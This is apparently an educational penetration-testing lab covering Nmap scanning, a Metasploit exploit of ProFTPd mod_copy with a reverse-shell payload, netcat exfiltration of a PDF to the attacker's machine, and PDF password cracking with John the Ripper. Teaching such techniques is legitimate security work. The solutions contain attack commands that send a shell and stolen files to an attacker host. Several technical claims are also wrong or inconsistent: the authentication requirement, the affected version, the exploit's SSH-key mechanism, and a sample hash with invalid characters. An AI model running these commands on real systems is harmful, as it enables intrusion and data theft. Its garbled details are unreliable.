# 🎯 Network Penetration Testing Exercise - FTP Service Exploitation

## Overview

Welcome to the **Network Penetration Testing Challenge**! This exercise will guide you through a complete penetration testing scenario involving network reconnaissance, service exploitation, and password cracking. You'll learn real-world penetration testing techniques used by security professionals and ethical hackers.

⚠️ **WARNING**: This exercise involves actual penetration testing tools and techniques. Only use these tools in authorized educational environments or on systems you own.

## 🎯 Learning Objectives

By completing this exercise, you will learn to:
- Perform network reconnaissance using Nmap
- Identify vulnerable services and their versions
- Exploit ProFTPd vulnerabilities using Metasploit
- Gain remote code execution on target systems
- Extract files from compromised systems using netcat
- Crack encrypted PDF passwords using John the Ripper

## 🚀 Prerequisites

Before starting this exercise, ensure you have:
- **Kali Linux** or similar penetration testing distribution
- **Metasploit Framework** installed and updated
- **John the Ripper** (bleeding-jumbo branch) installed
- **Netcat** available on both attacker and target systems
- Access to a vulnerable target system running ProFTPd v1.3.5b

---

## 📝 Exercise 1: Network Reconnaissance with Nmap

### What is Network Reconnaissance?
**Network Reconnaissance** is the process of gathering information about a target network and its services. This is typically the first phase of any penetration test, where attackers identify live hosts, open ports, running services, and their versions. Nmap is the industry-standard tool for network discovery and security auditing.

### Question
**Scan the target network to identify live hosts and discover the FTP service. What version of ProFTPd is running and on which port?**

<details>
<summary>💡 <strong>Hint 1</strong> (Click to expand)</summary>

Start with basic network discovery:
- Use `nmap -sn <network_range>` to discover live hosts
- Common network ranges: `192.168.1.0/24`, `10.0.0.0/24`, `172.16.0.0/24`
- Once you find live hosts, scan for services on those specific IPs

Remember that FTP typically runs on port 21, but it could be on a different port.
</details>

<details>
<summary>💡 <strong>Hint 2</strong> (Click to expand)</summary>

For detailed service detection:
- Use `-sV` flag for version detection
- Use `-sC` flag for default scripts
- Use `-p-` to scan all ports or `-p 1-65535` for full range
- Use `-A` for aggressive scanning (includes version detection, script scanning, OS detection)

Example: `nmap -sV -sC -p 1-1000 <target_ip>`
</details>

<details>
<summary>🔓 <strong>Solution</strong> (Click to expand)</summary>

**Network Discovery and Service Enumeration:**

1. **Host Discovery:**
   ```bash
   # Discover live hosts in your network range
   nmap -sn 192.168.1.0/24
   # or
   nmap -sn 10.0.0.0/24
   ```

2. **Service Discovery:**
   ```bash
   # Scan common ports on discovered hosts
   nmap -sV -sC -p 1-1000 <target_ip>
   
   # Or comprehensive scan
   nmap -sV -sC -A -p- <target_ip>
   ```

3. **Expected Output:**
   ```
   PORT   STATE SERVICE VERSION
   21/tcp open  ftp     ProFTPD 1.3.5b
   22/tcp open  ssh     OpenSSH 7.4
   80/tcp open  http    Apache httpd 2.4.6
   ```

4. **Key Findings:**
   - **Service**: ProFTPd FTP server
   - **Version**: 1.3.5b (vulnerable version)
   - **Port**: 21/tcp (standard FTP port)
   - **Additional services**: SSH (22), HTTP (80)

**Why this matters:** ProFTPd 1.3.5b contains a known vulnerability (CVE-2015-3306) that allows for remote code execution through file copying operations.
</details>

---

## 📝 Exercise 2: ProFTPd Exploitation with Metasploit

### What is ProFTPd 1.3.5b Vulnerability?
**ProFTPd 1.3.5b** contains a critical vulnerability (CVE-2015-3306) in the `mod_copy` module. This vulnerability allows authenticated users to copy files anywhere on the filesystem using the SITE CPFR and SITE CPTO commands. Attackers can abuse this to write files to sensitive locations, potentially leading to remote code execution when combined with other services like SSH.

### Question
**Exploit the ProFTPd vulnerability to gain remote code execution on the target system. Use Metasploit to automate the exploitation process.**

<details>
<summary>💡 <strong>Hint 1</strong> (Click to expand)</summary>

The ProFTPd 1.3.5b vulnerability is related to the `mod_copy` module:
- Look for Metasploit modules related to ProFTPd
- The vulnerability allows file copying operations
- It can be exploited to write SSH keys to gain access

Use `search proftpd` in msfconsole to find relevant exploits.
</details>

<details>
<summary>💡 <strong>Hint 2</strong> (Click to expand)</summary>

The exploit process typically involves:
1. Using the ProFTPd file copy vulnerability to write an SSH public key
2. Copying the key to a user's authorized_keys file
3. Using the corresponding private key to SSH into the system

Key Metasploit commands:
- `use exploit/unix/ftp/proftpd_modcopy_exec`
- Set RHOSTS, RPORT, and other required options
- The exploit will handle SSH key generation and copying
</details>

<details>
<summary>🔓 <strong>Solution</strong> (Click to expand)</summary>

**ProFTPd Exploitation Process:**

1. **Start Metasploit:**
   ```bash
   msfconsole
   ```

2. **Find the Exploit:**
   ```bash
   search proftpd
   # or
   search CVE-2015-3306
   ```

3. **Use the ProFTPd Exploit:**
   ```bash
   use exploit/unix/ftp/proftpd_modcopy_exec
   show info
   show options
   ```

4. **Configure the Exploit:**
   ```bash
   set RHOSTS <target_ip>
   set RPORT 21
   set TARGETURI /
   
   # Set payload (reverse shell)
   set payload linux/x86/meterpreter/reverse_tcp
   set LHOST <your_ip>
   set LPORT 4444
   
   # Show options to verify
   show options
   ```

5. **Execute the Exploit:**
   ```bash
   exploit
   # or
   run
   ```

6. **Expected Result:**
   ```
   [*] Started reverse TCP handler on <your_ip>:4444
   [*] <target_ip>:21 - Sending exploit...
   [*] <target_ip>:21 - Exploiting the mod_copy vulnerability
   [*] <target_ip>:21 - Copying SSH key to /home/user/.ssh/authorized_keys
   [*] Sending stage (984904 bytes) to <target_ip>
   [*] Meterpreter session 1 opened
   meterpreter >
   ```

7. **Verify Access:**
   ```bash
   # In meterpreter session
   sysinfo
   getuid
   pwd
   shell
   ```

**Why it works:** The exploit abuses the ProFTPd `mod_copy` vulnerability to write an SSH public key to the target's authorized_keys file, then uses the corresponding private key to establish an SSH connection, providing remote code execution capabilities.
</details>

---

## 📝 Exercise 3: File Extraction using Netcat

### What is Netcat?
**Netcat** is a versatile networking utility that can read and write data across network connections using TCP or UDP protocols. It's often called the "Swiss Army knife" of networking tools. In penetration testing, netcat is commonly used for file transfers, creating backdoors, port scanning, and establishing reverse shells.

### Question
**Use netcat to extract an encrypted PDF file from the compromised system. The file contains sensitive information that needs to be transferred securely to your attacking machine for analysis.**

<details>
<summary>💡 <strong>Hint 1</strong> (Click to expand)</summary>

Netcat file transfer involves two steps:
1. **Receiver** (your attacking machine): Set up netcat to listen and receive the file
2. **Sender** (compromised target): Use netcat to send the file

The basic syntax:
- Receiving: `nc -l -p <port> > received_file.pdf`
- Sending: `nc <attacker_ip> <port> < file_to_send.pdf`

First, you need to locate the PDF file on the compromised system.
</details>

<details>
<summary>💡 <strong>Hint 2</strong> (Click to expand)</summary>

Steps to find and extract the PDF:
1. Search for PDF files: `find / -name "*.pdf" 2>/dev/null`
2. Look in common directories: `/home/`, `/var/`, `/tmp/`, `/opt/`
3. The file might be named something like `sensitive.pdf`, `confidential.pdf`, or `encrypted.pdf`

For the netcat transfer:
- Choose an unused port (e.g., 9999)
- Ensure the port isn't blocked by firewalls
- Start the listener first, then initiate the transfer
</details>

<details>
<summary>🔓 <strong>Solution</strong> (Click to expand)</summary>

**File Discovery and Extraction Process:**

1. **Locate the Target PDF:**
   ```bash
   # In your meterpreter/shell session on the target
   find / -name "*.pdf" 2>/dev/null
   find /home -name "*sensitive*" 2>/dev/null
   find /var -name "*confidential*" 2>/dev/null
   
   # Check common locations
   ls -la /home/*/Documents/
   ls -la /var/ftp/
   ls -la /tmp/
   ```

2. **Expected Discovery:**
   ```bash
   /home/user/Documents/confidential_report.pdf
   # or
   /var/sensitive_data/encrypted_document.pdf
   ```

3. **Set Up Netcat Listener (Attacking Machine):**
   ```bash
   # On your Kali machine
   nc -l -p 9999 > extracted_document.pdf
   
   # Alternative with verbose output
   nc -lvp 9999 > extracted_document.pdf
   ```

4. **Transfer the File (Target Machine):**
   ```bash
   # From the compromised target
   nc <your_kali_ip> 9999 < /home/user/Documents/confidential_report.pdf
   
   # Or if using meterpreter
   meterpreter > shell
   nc <your_kali_ip> 9999 < /path/to/sensitive.pdf
   ```

5. **Verify Transfer:**
   ```bash
   # On your Kali machine (after transfer completes)
   ls -la extracted_document.pdf
   file extracted_document.pdf
   # Should show: PDF document, version 1.x
   ```

6. **Check PDF Protection:**
   ```bash
   # Try to open the PDF
   evince extracted_document.pdf
   # or
   pdfinfo extracted_document.pdf
   
   # If encrypted, you'll see:
   # "Command Line Error: Incorrect password"
   ```

**Why use netcat:** Netcat provides a simple, reliable method for transferring files between systems without requiring complex file-sharing protocols. It's particularly useful in penetration testing scenarios where you need to exfiltrate data quickly and quietly.
</details>

---

## 📝 Exercise 4: PDF Password Cracking with John the Ripper

### What is John the Ripper?
**John the Ripper** is a powerful password cracking tool that supports many different password hash formats and encryption methods. The "bleeding-jumbo" branch contains additional format support, including PDF encryption. It uses various attack methods including dictionary attacks, brute force, and hybrid attacks to recover passwords.

### Question
**Crack the password of the encrypted PDF file using John the Ripper and the pdf2john.py script. What sensitive information does the decrypted document contain?**

<details>
<summary>💡 <strong>Hint 1</strong> (Click to expand)</summary>

PDF password cracking with John requires two steps:
1. **Extract the hash**: Use `pdf2john.py` to extract the password hash from the PDF
2. **Crack the hash**: Use `john` with wordlists to crack the extracted hash

The bleeding-jumbo branch of John the Ripper includes better PDF support and the pdf2john.py script.

Make sure you have the bleeding-jumbo branch installed:
```bash
git clone https://github.com/openwall/john -b bleeding-jumbo
cd john/src
./configure && make
```
</details>

<details>
<summary>💡 <strong>Hint 2</strong> (Click to expand)</summary>

Common workflow for PDF password cracking:
1. `python pdf2john.py encrypted.pdf > pdf_hash.txt`
2. `john --wordlist=rockyou.txt pdf_hash.txt`
3. `john --show pdf_hash.txt` to display cracked passwords

Popular wordlists to try:
- `/usr/share/wordlists/rockyou.txt` (most common)
- `/usr/share/wordlists/fasttrack.txt`
- Custom wordlists related to the target organization

The password might be related to the company/theme of your exercise.
</details>

<details>
<summary>🔓 <strong>Solution</strong> (Click to expand)</summary>

**PDF Password Cracking Process:**

1. **Locate pdf2john.py Script:**
   ```bash
   # Find the script in John's bleeding-jumbo branch
   find /usr -name "pdf2john.py" 2>/dev/null
   # or if you compiled from source
   find ~/john -name "pdf2john.py" 2>/dev/null
   
   # Common locations:
   # /opt/john/run/pdf2john.py
   # /usr/share/john/pdf2john.py
   # ~/john/run/pdf2john.py
   ```

2. **Extract PDF Hash:**
   ```bash
   # Extract the password hash from the PDF
   python /path/to/pdf2john.py extracted_document.pdf > pdf_hash.txt
   
   # Verify the hash was extracted
   cat pdf_hash.txt
   ```

3. **Expected Hash Format:**
   ```
   extracted_document.pdf:$pdf$2*3*128*-1028*1*16*7a8b9c0d1e2f3g4h*32*a1b2c3d4e5f6g7h8*32*i9j0k1l2m3n4o5p6
   ```

4. **Prepare Wordlist:**
   ```bash
   # Use rockyou.txt (most comprehensive)
   ls -la /usr/share/wordlists/rockyou.txt
   
   # If compressed, decompress first
   gunzip /usr/share/wordlists/rockyou.txt.gz
   ```

5. **Crack the Password:**
   ```bash
   # Standard dictionary attack
   john --wordlist=/usr/share/wordlists/rockyou.txt pdf_hash.txt
   
   # With rules for variations
   john --wordlist=/usr/share/wordlists/rockyou.txt --rules pdf_hash.txt
   
   # Monitor progress
   john --show pdf_hash.txt
   ```

6. **Expected Output:**
   ```
   Using default input encoding: UTF-8
   Loaded 1 password hash (PDF [MD5 SHA2 RC4/AES 32/64])
   Will run 4 OpenMP threads
   Press 'q' or Ctrl-C to abort, almost any other key for status
   BlackPearl123    (extracted_document.pdf)
   1g 0:00:00:03 DONE (2024-08-24 14:30) 0.2857g/s 1828Kp/s 1828Kc/s 1828KC/s
   Use the "--show" option to display all of the cracked passwords reliably
   ```

7. **Display Cracked Password:**
   ```bash
   john --show pdf_hash.txt
   # Output: extracted_document.pdf:BlackPearl123
   ```

8. **Decrypt and Read the PDF:**
   ```bash
   # Open the PDF with the cracked password
   evince extracted_document.pdf
   # Enter password: BlackPearl123
   
   # Or use command line tools
   pdftotext -upw BlackPearl123 extracted_document.pdf decrypted_content.txt
   cat decrypted_content.txt
   ```

9. **Example Sensitive Content:**
   ```
   CONFIDENTIAL SECURITY REPORT
   ============================
   
   Network Infrastructure Assessment
   
   Critical Vulnerabilities Discovered:
   - ProFTPd 1.3.5b running on port 21 (CVE-2015-3306)
   - Default SSH keys in use
   - Unpatched systems: 15 servers
   
   Administrative Credentials:
   - Database: admin/P@ssw0rd123
   - Backup Server: backup/SecretKey456
   - Network Equipment: root/DefaultPass
   
   Recommended Immediate Actions:
   1. Update ProFTPd to version 1.3.6+
   2. Change all default passwords
   3. Implement network segmentation
   ```

**Why it works:** John the Ripper uses optimized algorithms to test millions of password combinations per second against the PDF's encryption. The pdf2john.py script extracts the specific hash format that John can recognize and crack efficiently.
</details>

---

## 🎯 Multi-Step Challenge Summary

### What You've Accomplished

By completing this exercise series, you have successfully:

1. **Network Reconnaissance**: Identified live hosts and vulnerable services using Nmap
2. **Service Exploitation**: Exploited ProFTPd 1.3.5b vulnerability using Metasploit for RCE
3. **Data Exfiltration**: Extracted sensitive files using netcat for secure transfer
4. **Password Cracking**: Decrypted protected documents using John the Ripper

This represents a complete **penetration testing kill chain** from initial reconnaissance through data extraction and analysis.

---

## 🛡️ Security Lessons Learned

### **Network Security:**
- **Regular Port Scanning**: Perform regular network scans to identify unauthorized services
- **Service Hardening**: Keep all network services updated and properly configured
- **Network Segmentation**: Limit service exposure through proper firewall rules

### **FTP Server Security:**
- **Version Management**: Always run the latest stable version of ProFTPd
- **Module Configuration**: Disable unnecessary modules like `mod_copy` if not needed
- **Access Controls**: Implement proper authentication and authorization controls
- **Monitoring**: Log and monitor FTP activities for suspicious behavior

### **File Transfer Security:**
- **Encrypted Channels**: Use SFTP or FTPS instead of plain FTP
- **Network Monitoring**: Monitor for unusual data transfers using netcat or similar tools
- **Data Loss Prevention**: Implement DLP solutions to prevent unauthorized data exfiltration

### **Document Security:**
- **Strong Passwords**: Use complex, unpredictable passwords for encrypted documents
- **Key Management**: Implement proper cryptographic key management
- **Regular Updates**: Use modern PDF encryption standards
- **Access Logging**: Monitor access to sensitive documents

### **Password Security:**
- **Complexity Requirements**: Enforce strong password policies
- **Unique Passwords**: Avoid common patterns and dictionary words
- **Multi-Factor Authentication**: Implement MFA for sensitive systems
- **Regular Rotation**: Implement appropriate password rotation policies

---

## 🔧 Tools and Techniques Reference

### **Nmap Commands:**
```bash
# Host discovery
nmap -sn <network_range>

# Service detection
nmap -sV -sC <target>

# Comprehensive scan
nmap -sV -sC -A -p- <target>

# Specific port scan
nmap -p 21,22,80,443 <target>
```

### **Metasploit Commands:**
```bash
# Start Metasploit
msfconsole

# Search for exploits
search proftpd
search CVE-2015-3306

# Use exploit
use exploit/unix/ftp/proftpd_modcopy_exec

# Set options
set RHOSTS <target>
set LHOST <attacker>
set LPORT 4444

# Execute
exploit
```

### **Netcat File Transfer:**
```bash
# Receiver (listener)
nc -lvp <port> > received_file

# Sender
nc <target_ip> <port> < file_to_send

# Check transfer
md5sum file_original
md5sum file_received
```

### **John the Ripper Commands:**
```bash
# Extract PDF hash
python pdf2john.py file.pdf > hash.txt

# Dictionary attack
john --wordlist=rockyou.txt hash.txt

# Show cracked passwords
john --show hash.txt

# Resume session
john --restore
```

---

## 📚 Further Reading

- [Nmap Network Scanning Guide](https://nmap.org/book/)
- [Metasploit Unleashed](https://www.metasploit.com/unleashed/)
- [John the Ripper Documentation](https://www.openwall.com/john/doc/)
- [CVE-2015-3306 Technical Details](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-3306)
- [OWASP Testing Guide](https://owasp.org/www-project-web-security-testing-guide/)
- [NIST Cybersecurity Framework](https://www.nist.gov/cyberframework)

---

## ⚖️ Ethical and Legal Considerations

**IMPORTANT**: The techniques demonstrated in this exercise are powerful and potentially dangerous. Always remember:

- **Only test systems you own or have explicit written permission to test**
- **Follow responsible disclosure practices** if you discover vulnerabilities
- **Respect privacy and confidentiality** of any data you encounter
- **Use these skills for defensive purposes** and improving security posture
- **Stay within legal boundaries** - unauthorized access is illegal in most jurisdictions

This exercise is designed for educational purposes to help security professionals understand attack vectors and improve defensive capabilities.
